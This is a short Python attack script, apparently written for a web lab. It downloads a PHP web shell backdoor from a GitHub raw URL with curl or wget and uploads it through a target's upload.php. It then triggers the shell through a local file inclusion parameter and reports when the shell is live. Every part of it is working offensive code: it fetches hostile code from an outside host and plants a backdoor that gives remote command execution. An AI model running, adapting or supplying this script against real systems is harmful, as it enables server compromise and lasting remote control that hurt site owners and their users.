import os
import argparse
import requests
from urllib.parse import urljoin

def download_shell(method: str, output: str):
    shell_url = "https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/1.x.x/gel4y.php"

    print(f"[+] Downloading shell using {method} ...")
    try:
        if method == "curl":
            os.system(f"curl {shell_url} -o {output}")
        elif method == "wget":
            os.system(f"wget {shell_url} -O {output}")
        else:
            print("[!] Invalid method, use curl or wget")
            return False
        return True
    except Exception as e:
        print(f"[!] Error downloading shell: {e}")
        return False

def upload_shell(base_url, shell_path):
    url = urljoin(base_url, "upload.php")
    print(f"[+] Uploading shell to: {url}")

    with open(shell_path, 'rb') as f:
        files = {'file': (os.path.basename(shell_path), f)}
        response = requests.post(url, files=files)

    if "File uploaded" in response.text:
        print("[+] Upload successful!")
        return True
    else:
        print("[-] Upload failed.")
        return False

def trigger_lfi(base_url, shell_name):
    lfi_url = f"{base_url}index.php?page=uploads/{shell_name}"
    print(f"[+] Trying to access shell via LFI: {lfi_url}")

    try:
        r = requests.get(lfi_url)
        if "Mini Shell" in r.text or "cmd" in r.text:
            print(f"[✓] SHELL IS LIVE ➜ {lfi_url}")
        else:
            print("[!] LFI triggered but shell not loading correctly.")
    except Exception as e:
        print(f"[!] Error accessing shell: {e}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="Target base URL, e.g. http://localhost/labs/", required=True)
    parser.add_argument("--method", help="Download method: curl or wget", choices=["curl", "wget"], default="curl")
    args = parser.parse_args()

    shell_file = "gel4y.php"

    if not download_shell(args.method, shell_file):
        return

    if not upload_shell(args.url, shell_file):
        return

    trigger_lfi(args.url, shell_file)

if __name__ == "__main__":
    main()
